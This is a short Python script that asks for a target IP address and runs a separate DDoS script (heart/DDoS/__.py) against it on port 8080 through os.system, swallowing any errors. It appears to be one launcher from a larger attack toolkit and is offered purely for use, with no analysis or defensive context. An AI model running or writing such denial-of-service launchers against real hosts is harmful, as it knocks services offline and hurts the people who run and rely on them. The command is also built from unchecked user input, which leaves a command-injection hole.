import os
try:
    ip = input(' Target IP : ')
    port = '8080'
    byte = '135'
    os.system('python heart/DDoS/__.py -s %s -p %s -t %s' % (ip, port, byte))
except:
    pass
